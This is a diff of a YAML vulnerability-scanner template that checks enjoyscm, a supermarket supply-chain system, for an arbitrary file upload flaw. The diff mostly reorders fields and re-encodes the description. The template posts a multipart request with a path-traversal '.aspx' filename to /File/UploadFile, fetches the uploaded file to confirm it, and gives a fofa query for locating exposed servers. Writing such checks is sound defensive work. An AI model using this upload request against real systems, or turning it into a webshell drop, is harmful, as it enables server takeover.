@@ -1,47 +1,36 @@
+expression: r0() && r1()
 id: enjoyscm-uploadfile
-
 info:
-  name: enjoyscm UploadFile任意文件上传
   author: zan8in
+  description: "enjoyscm\u662F\u56FD\u5185\u90E8\u5206\u8D85\u5E02\u4F7F\u7528\u7684\
+    \u4E00\u79CD\u4F9B\u5E94\u94FE\u7BA1\u7406\u7CFB\u7EDF\u3002enjoyscm UploadFile\u53C2\
+    \u6570\u5B58\u5728 \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\
+    \u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u83B7\u53D6\u670D\u52A1\u5668\
+    \u6743\u9650\u3002\nfofa\uFF1Atitle=\"\u4F9B\u5E94\u5546\u7F51\u4E0A\u670D\u52A1\
+    \u5385\"\n"
+  name: "enjoyscm UploadFile\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20"
   severity: high
   verified: true
-  description: |-
-    enjoyscm是国内部分超市使用的一种供应链管理系统。enjoyscm UploadFile参数存在 任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。
-    fofa: title="供应商网上服务厅"
-  tags: enjoyscm,uploadfile
-  created: 2024/01/08
-
-set:
-  randstr: randomLowercase(5)
-  randbody: randomLowercase(28)
-  rboundary: randomLowercase(8)
 rules:
   r0:
+    expression: true
     request:
-      method: POST
-      path: /File/UploadFile
+      body: "--WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+        \ name=\"file\"; filename=\"../../../{{randstr}}.aspx\"\r\nContent-Type: image/jpeg\r\
+        \n\r\nhello {{randbody}}\r\n--WebKitFormBoundary{{rboundary}}\r\nContent-Disposition:\
+        \ form-data; name=\"action\"\r\n\r\nunloadfile\r\n--WebKitFormBoundary{{rboundary}}\r\
+        \nContent-Disposition: form-data; name=\"filepath\"\r\n\r\n\r\n--WebKitFormBoundary{{rboundary}}--\r\
+        \n"
       headers:
         Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
-      body: "\
-        --WebKitFormBoundary{{rboundary}}\r\n\
-        Content-Disposition: form-data; name=\"file\"; filename=\"../../../{{randstr}}.aspx\"\r\n\
-        Content-Type: image/jpeg\r\n\
-        \r\n\
-        hello {{randbody}}\r\n\
-        --WebKitFormBoundary{{rboundary}}\r\n\
-        Content-Disposition: form-data; name=\"action\"\r\n\
-        \r\n\
-        unloadfile\r\n\
-        --WebKitFormBoundary{{rboundary}}\r\n\
-        Content-Disposition: form-data; name=\"filepath\"\r\n\
-        \r\n\
-        \r\n\
-        --WebKitFormBoundary{{rboundary}}--\r\n\
-        "
-    expression: true
+      method: POST
+      path: /File/UploadFile
   r1:
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
     request:
       method: GET
       path: /{{randstr}}.aspx
-    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
-expression: r0() && r1()
+set:
+  randbody: randomLowercase(28)
+  randstr: randomLowercase(5)
+  rboundary: randomLowercase(8)
